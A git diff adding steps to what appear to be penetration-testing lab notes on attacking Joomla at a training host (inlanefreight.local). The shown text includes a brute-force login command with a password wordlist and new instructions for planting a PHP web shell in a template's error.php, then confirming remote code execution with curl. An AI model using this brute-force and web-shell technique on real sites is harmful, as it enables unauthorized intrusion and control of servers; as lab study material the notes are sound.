@@ -58,3 +58,22 @@ Use [joom3y](https://github.com/dietcokesec/joom3y) for fast login brute-force
 ```
 python3 main.py -u http://app.inlanefreight.local -w rockyou.txt -usr admin -v
 ```
+
+
+
+
+If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.
+
+From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
+
+Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.
+
+Finally, we can click on a page to pull up the page source.
+Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.
+```php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+```
+Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.
+```shell-session
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+```
